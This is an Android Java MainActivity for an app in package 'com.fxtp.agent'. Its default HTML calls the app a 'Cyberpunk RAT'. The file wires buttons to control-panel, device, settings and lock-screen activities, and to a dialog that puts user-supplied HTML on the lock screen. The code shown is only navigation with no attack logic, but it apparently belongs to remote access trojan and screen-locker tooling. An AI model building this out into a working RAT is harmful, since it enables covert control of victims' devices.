package com.fxtp.agent;

import android.app.KeyguardManager;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        Button btnControl = findViewById(R.id.btnControlPanel);
        Button btnDevice = findViewById(R.id.btnDevice);
        Button btnSettings = findViewById(R.id.btnSettings);
        Button btnLock = findViewById(R.id.btnLock);
        Button btnDisplayHtml = findViewById(R.id.btnDisplayHtml);
        Button btnExit = findViewById(R.id.btnExit);

        btnControl.setOnClickListener(v -> {
            startActivity(new Intent(MainActivity.this, ControlPanelActivity.class));
        });

        btnDevice.setOnClickListener(v -> {
            startActivity(new Intent(MainActivity.this, DeviceActivity.class));
        });

        btnSettings.setOnClickListener(v -> {
            startActivity(new Intent(MainActivity.this, SettingsActivity.class));
        });

        btnLock.setOnClickListener(v -> {
            Intent lockIntent = new Intent(MainActivity.this, LockActivity.class);
            lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(lockIntent);
        });

        btnDisplayHtml.setOnClickListener(v -> {
            // Show a dialog to enter HTML
            android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
            builder.setTitle("Enter HTML to display");
            final android.widget.EditText input = new android.widget.EditText(this);
            input.setText("<h1 style='color:#00f0ff;'>FXTP</h1><p>Cyberpunk RAT</p>");
            builder.setView(input);
            builder.setPositiveButton("Display", (dialog, which) -> {
                String html = input.getText().toString();
                Intent intent = new Intent(MainActivity.this, LockActivity.class);
                intent.putExtra("html_content", html);
                intent.putExtra("display_html", true);
                startActivity(intent);
            });
            builder.setNegativeButton("Cancel", null);
            builder.show();
        });

        btnExit.setOnClickListener(v -> {
            finishAffinity();
        });
    }
}
